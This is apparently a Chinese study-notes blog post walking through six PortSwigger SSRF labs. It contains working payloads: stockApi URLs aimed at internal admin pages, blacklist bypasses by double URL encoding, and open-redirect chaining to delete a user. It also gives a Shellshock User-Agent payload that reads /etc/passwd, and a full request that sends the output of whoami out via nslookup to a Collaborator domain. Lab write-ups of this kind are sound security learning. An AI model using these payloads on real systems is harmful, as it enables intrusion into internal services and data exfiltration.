---
title: PortSwigger-SSRF
date: 2026-03-25 16:38:37
tags:
  - SSRF
  - PortSwigger
categories:
  - 学习笔记
description: 记录了在 PortSwigger 靶场中完成基础 SSRF 漏洞实战的完整学习过程，包含了抓包分析与 payload 构造思路。
index_img: /img/heid.png
banner_img: /img/default.png
---

## Lab1: Basic SSRF against the local server
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142213.png)
说库存检查功能有问题,去相关位置抓个包

![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142520.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142635.png)
发到重放器,然后注意到有个stockApi,再发到编码区看看
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142807.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325142851.png)
根据题目，将stockApi参数中的URL更改为http://localhost/admin，这样就把URL交给服务端访问，服务端的localhost请求就来着本地，这样就进入了管理页面
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143510.png)
可以看到出现删除carlos用户，查看这个删除按钮的代码
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143725.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144019.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325143927.png)
跟踪重定向成功完成


## Lab2: Basic SSRF against another back-end system
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144244.png)
那么admin就在`192.168.0.X:8080/admin`，其中`X`不知道需要扫出来
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144759.png)
解码查看
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325144844.png)
```
http://192.168.0.1:8080/product/stock/check?productId=5&storeId=1
```
改成
```
192.168.0.X:8080/admin
```
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145030.png)
那爆破`X`，`Ctrl+I`发送到攻击器爆破
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145249.png)
筛选一下可以看到120是响应200
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145443.png)
进到管理页面找到删除功能
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145556.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145639.png)
成功删除
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325145909.png)


## Lab3: Blind SSRF with out-of-band detection
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325150626.png)
随便点开一个页面抓包
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325150814.png)
发重发器，`Referer`按要求将原始域名替换为 Burp Collaborator 生成的域名
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151025.png)
如果没有成功，等几秒钟再试一次，因为服务器端命令是异步执行的
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151317.png)
这里可以看到访问信息
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151617.png)


## Lab4: SSRF with blacklist-based input filter
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325151747.png)
还是库存检查功能问题，但有黑名单，先随便进一个网页抓包发到重发器
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153038.png)
不出意外被过滤了
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153252.png)
无疑是`localhost`或者`admin`被过滤了
`localhost`可以换成`127.0.0.1`,`127.1`
`admin`可以通过`URL`编码
```
stockApi=http://127.0.0.1/

stockApi=http://127.1/

stockApi=http://127.1/admin

URL编码一次
stockApi=http://127.1/%61%64%6d%69%6e

URL编码两次(成功)
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325153910.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154534.png)

最后，找到删除按钮的代码传过去
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154702.png)
点一下重定向跟踪，完成实验
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325154747.png)


## Lab5: SSRF with filter bypass via open redirection vulnerability
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160423.png)
先随便进一个网页抓包发到重发器
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160601.png)
直接把api改成http://192.168.0.12:8080/admin肯定是不行的，只能从本地应用获取
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325160732.png)
从其他包找突破口，在每次点击下一页的时候发现都有一次重定向
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161126.png)
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161154.png)
发现这个包是GET传参，头部控制重定向地址，这个可以利用一下
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325161354.png)
让检查库存的api去访问这样一个地址,那这个地址对于网站来说肯定是属于内部，尝试看看
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162037.png)
成功，注意要URL编码
那下面我们控制其中的参数，让其重定向地址到我们的`http://192.168.0.12:8080/admin`
```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin

//URL编码
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162355.png)
成功进入管理页面，最后找到删除`carlos`功能按钮代码，写入`stockApi`
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162448.png)
```
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
```
![](/img/PortSwigger-SSRF/Pasted%20image%2020260325162727.png)


## Lab6: Blind SSRF with Shellshock exploitation
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326102700.png)
先了解下`Shellshock`漏洞原理,学习博客参考:
```
https://www.freebuf.com/articles/system/279713.html
```
对于这道题，要知道漏洞复现的方式：
```
User-Agent: () { :; }; echo; /bin/cat /etc/passwd
```
`() { :; };`后面为我们要接的命令

下面对实验室其中一个产品进行抓包,发到重发器
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105104.png)
按实验说明，`Referer`是存放URL的，`192.168.0.X`中的`X`不知道需要爆破，发送到攻击器
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105859.png)

`User-Agent`是我们的突破点，现在的问题是我们构造怎样的payload拿到用户名
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326105201.png)

实验描述是盲 `SSRF` 攻击，没有回显，为了看到命令执行的结果，我们需要让目标服务器主动把数据送到我们控制的公网服务器上，结合利用 DNS 协议进行数据外带的方法
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326111758.png)
Burp Collaborator 的默认公共服务器

结合`Shellshock`漏洞

`/usr/bin/nslookup`这是一个用于查询 DNS（域名系统）记录的网络命令行工具。在这里，它的作用是强制目标服务器对外发起一个 DNS 查询请求

**`$(whoami)`**：这是 Linux/Bash 中的命令替换语法。系统会优先执行括号内的 `whoami` 命令（该命令的作用是输出当前运行该进程的操作系统用户名），然后将其输出结果填补回原来的位置。假设当前运行的用户是 `peter`，那么 `$(whoami)` 就会被替换成 `peter`

后面的就是Burp Collaborator 的默认公共服务器
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326111947.png)
**完整的执行流程：**

1. 通过 SSRF 配合 Shellshock 漏洞，你成功让后端服务器执行了这段代码。
2. 服务器首先解析 `$()` 内的内容，执行 `whoami` 命令，假设得到结果 `peter`。
3. 系统将结果拼接，此时实际执行的命令变成了：`/usr/bin/nslookup peter.你的Collaborator域名`。
4. 服务器执行 `nslookup`，向互联网发出一个 DNS 请求，试图查询 `peter.你的Collaborator域名` 的 IP 地址。
5. 这个 DNS 查询请求顺着网络路由，最终到达了 Burp Collaborator 服务器。
6. 在 Burp Suite 的 Collaborator 标签页中点击“立即投票(Poll now)”，就会看到这条 DNS 交互记录。通过观察请求的子域名部分（`peter`），于是就成功地在完全没有页面回显的情况下，获取到了目标系统的用户名

最终完整的POC：
```
GET /product?productId=1 HTTP/2
Host: 0ad500e703ea4437817bed1c00d300ff.web-security-academy.net
Cookie: session=rBF8hJt8ItJXdBy5oSTYeDuq7OySGIP7
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).6y5c2m981g5oadwdsfv1wqs9y04rskg9.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://192.168.0.X:8080
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i


```
爆破
![](/img/PortSwigger-SSRF/Pasted%20image%2020260326112853.png)
在协作器成功得到用户名`peter-S8Ob7W`
